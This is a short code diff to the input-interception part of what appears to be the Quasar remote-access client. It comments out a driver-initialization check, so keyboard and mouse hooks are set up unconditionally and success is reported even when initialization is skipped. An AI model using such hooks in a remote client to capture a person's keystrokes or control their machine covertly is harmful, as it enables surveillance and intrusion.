@@ -731,14 +731,14 @@ namespace Quasar.Client.Interception
         {
             if (InputInterceptor.CheckDriverInstalled())
             {
-                if (InputInterceptor.Initialize())
-                {
-                    mouseHook = new MouseHook(null);
-                    keyboardHook = new KeyboardHook(null);
-                    isInitialized = true;
-                    return true;
-                }
-                client.Send(new SetStatus { Message = "KB/M driver initialization failed!" });
+                //if (InputInterceptor.Initialize())
+                //{
+                mouseHook = new MouseHook(null);
+                keyboardHook = new KeyboardHook(null);
+                isInitialized = true;
+                return true;
+                //}
+                //client.Send(new SetStatus { Message = "KB/M driver initialization failed!" });
             }
             else client.Send(new SetStatus { Message = "KB/M driver is not installed!" });
             return false;
